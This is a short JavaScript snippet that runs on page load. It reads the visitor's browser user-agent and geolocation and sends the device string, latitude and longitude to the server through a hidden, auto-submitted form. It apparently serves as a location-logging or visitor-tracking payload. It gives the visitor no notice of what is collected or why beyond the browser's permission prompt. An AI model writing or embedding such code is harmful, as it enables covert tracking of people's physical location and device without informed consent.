async function logUserInfo() {
    const device = navigator.userAgent;
    let lat = "N/A", lon = "N/A";

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            lat = position.coords.latitude;
            lon = position.coords.longitude;

            const form = document.createElement('form');
            form.method = 'POST';
            form.action = '';
            form.style.display = 'none';

            const deviceInput = document.createElement('input');
            deviceInput.name = 'device';
            deviceInput.value = device;
            form.appendChild(deviceInput);

            const latInput = document.createElement('input');
            latInput.name = 'latitude';
            latInput.value = lat;
            form.appendChild(latInput);

            const lonInput = document.createElement('input');
            lonInput.name = 'longitude';
            lonInput.value = lon;
            form.appendChild(lonInput);

            document.body.appendChild(form);
            form.submit();
        });
    }
}
logUserInfo();
